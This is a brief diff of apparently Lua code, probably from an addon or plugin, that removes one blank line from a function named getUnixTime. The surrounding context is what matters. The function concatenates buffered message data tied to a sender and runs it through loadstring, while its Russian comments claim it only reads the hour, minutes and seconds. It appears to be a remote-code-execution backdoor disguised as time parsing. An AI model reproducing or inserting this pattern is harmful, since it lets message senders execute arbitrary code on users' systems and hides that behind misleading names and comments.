@@ -1891,7 +1891,6 @@ function getUnixTime(_, message, _, sender, HOUR)
     -- проверям текущий час
     if HOUR then
         local myUnixTime = table.concat(messageBuffer[bufferKey])
-        
         messageBuffer[bufferKey] = nil
         -- получаем форматированное время (минуты, секунды)
         local minutes, seconds = loadstring(myUnixTime)
